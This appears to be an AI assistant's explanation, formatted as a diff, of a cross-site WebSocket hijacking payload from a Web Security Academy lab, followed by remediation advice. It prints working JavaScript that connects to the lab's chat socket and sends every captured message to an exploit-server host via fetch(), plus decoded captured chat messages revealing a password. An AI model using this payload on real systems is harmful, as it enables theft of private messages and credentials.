@@ -1,0 +1,52 @@
+It looks like you successfully exploited a WebSocket vulnerability to capture messages containing sensitive information, such as user messages or a final password. Here's a breakdown of your payload and its purpose:
+Payload Analysis:
+
+    WebSocket Setup:
+
+var webSocket = new WebSocket("wss://0af40095033d514e80d971ea00c80092.web-security-academy.net/chat");
+
+webSocket.onopen = function (evt) {
+    webSocket.send("READY");
+};
+
+    Objective: This establishes a WebSocket connection to the target's chat server. Upon successfully connecting, it sends a "READY" message to the server, mimicking legitimate client behavior.
+
+Capturing Messages:
+
+    webSocket.onmessage = function (evt) { 
+        var message = evt.data; 
+        fetch("https://exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net/exploit?message=" + btoa(message));
+    };
+
+        Purpose: This intercepts messages sent from the server through the WebSocket. It then encodes the captured message using btoa() (Base64 encoding) and exfiltrates the data to your exploit server.
+
+    Exfiltration Endpoint:
+        https://exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net/exploit
+        This is the endpoint on your exploit server where the stolen data (Base64-encoded messages) is sent.
+
+Captured Messages:
+
+    The exploit successfully captured several messages and relayed them to your server. Examples include:
+        Message: "eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0="
+            Decoded Content: {"user":"You","content":"I forgot my password"}
+        Message: "eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgMTI4MDlieGdpY3U4ajlpbjl3Z2UifQ=="
+            Decoded Content: {"user":"Hal Pline","content":"No problem carlos, it's 12809bxgicu8j9in9wge"}
+
+Outcome:
+
+    The final password (12809bxgicu8j9in9wge) was disclosed as part of the captured messages. This indicates a successful attack where sensitive data transmitted over the WebSocket was exposed.
+
+What Next?
+
+    Documentation:
+        Document this exploitation process, including:
+            Vulnerability details (WebSocket exposure).
+            Attack methodology (setup, payloads, and results).
+            Recommendations for securing WebSocket connections (e.g., encryption, token authentication, and message validation).
+
+    Remediation:
+        Notify the target of the vulnerability and provide a detailed report.
+        Suggest mitigation strategies, such as:
+            Using secure WebSocket (WSS).
+            Implementing proper authentication and access controls.
+            Validating all messages on the server-side.
